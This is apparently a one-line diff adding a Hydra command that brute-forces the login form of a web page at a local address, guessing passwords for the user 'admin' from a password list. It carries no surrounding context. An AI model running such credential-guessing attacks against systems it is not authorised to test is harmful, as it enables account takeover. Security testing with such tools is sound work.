@@ -1,0 +1,1 @@
+hydra -l admin -P passlist.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=login failed"
